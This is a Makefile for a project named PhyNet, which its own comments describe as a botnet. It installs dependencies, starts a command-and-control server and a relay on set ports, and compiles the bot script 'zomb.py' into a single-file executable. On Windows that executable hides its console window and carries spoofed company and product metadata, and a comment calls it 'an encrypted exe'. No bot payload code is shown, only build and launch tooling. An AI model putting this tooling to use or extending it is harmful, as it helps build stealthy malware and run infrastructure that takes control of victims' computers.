# default config:
PY_EXE := py # may be python3 if you're on linux or on certain windows version

CNC_PORT := 8080
RELAY_PORT := 5000

# nuitka config:
NUITKA_EXE_NAME := phynet
NUITKA_ARGS := -onefile --follow-imports --lto=no --remove-output --output-dir=bin/
NUITKA_WIN_ARGS := --mingw64 --windows-disable-console --windows-company-name="$(NUITKA_EXE_NAME)" --windows-product-name="$(NUITKA_EXE_NAME)" --windows-product-version="1.0"

# windows/linux
ifeq ($(OS),Windows_NT)
	NUITKA_ARGS += $(NUITKA_WIN_ARGS)
else
	PY_EXE += thon3
endif

# will install python modules for running the botnet locally (not for the relay)
install:
	@$(PY_EXE) -m pip install -r PhyNet/bot/requirements.txt
	@$(PY_EXE) -m pip install -r PhyNet/server/requirements.txt

# install locally the nuitka compiller (will be used to output an encrypted exe for bot)
install-nuitka:
	@$(PY_EXE) -m pip install nuitka

# start the cnc
cnc:
	@$(PY_EXE) PhyNet/server/cnc/cnc.py $(CNC_PORT)

# start the relay
relay:
	@$(PY_EXE) PhyNet/server/relay/relay.py $(RELAY_PORT)

# build the bot
build-bot: | install install-nuitka
	$(PY_EXE) -m nuitka PhyNet/bot/zomb.py $(NUITKA_ARGS)
